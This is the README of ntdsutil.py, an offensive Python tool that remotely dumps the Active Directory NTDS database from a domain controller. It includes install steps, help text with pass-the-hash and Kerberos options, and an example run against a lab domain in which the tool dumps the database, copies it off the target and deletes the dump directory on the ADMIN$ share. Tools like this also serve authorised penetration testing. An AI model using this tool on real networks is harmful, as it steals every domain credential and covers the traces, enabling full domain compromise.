# ntdsutil.py

Dump NTDS with ntdsutil remotely

## Install

```text
https://github.com/zblurx/ntdsutil.py
cd ntdsutil.py
pip install .
```

## Usage

```text
$ ntdsutil.py -h
/home/tse/Documents/Dev/ntdsutil.py/venv/bin/ntdsutil.py:278: SyntaxWarning: "is not" with a literal. Did you mean "!="?
  if options.outputdir is not None and options.outputdir is not '':
usage: ntdsutil.py [-h] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-codec CODEC] [-outputdir OUTPUTDIR] target

Dump NTDS with ntdsutil, remotely

positional arguments:
  target                [[domain/]username[:password]@]<target name or address>

options:
  -h, --help            show this help message and exit
  -debug                Turn DEBUG output ON
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the
                        command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -codec CODEC          Sets encoding used (codec) from the target's output (default "utf-8"). If errors are detected, run chcp.com at the target, map the result with
                        https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py again with -codec and the corresponding codec
  -outputdir OUTPUTDIR  Output directory to store dumped file
```

## Example

```text
$ ntdsutil.py waza.local/administrator:'Password!123'@192.168.56.112
[*] Connected to 192.168.56.112 as waza.local\administrator (admin)
[*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\JENWGfEd
[*] NTDS successfuly dumped!
[*] Copying NTDS dump to ntdsutil
[*] NTDS dump copied to ntdsutil
[*] Deleted C:\Windows\Temp\JENWGfEd dump directory on the ADMIN$ share
```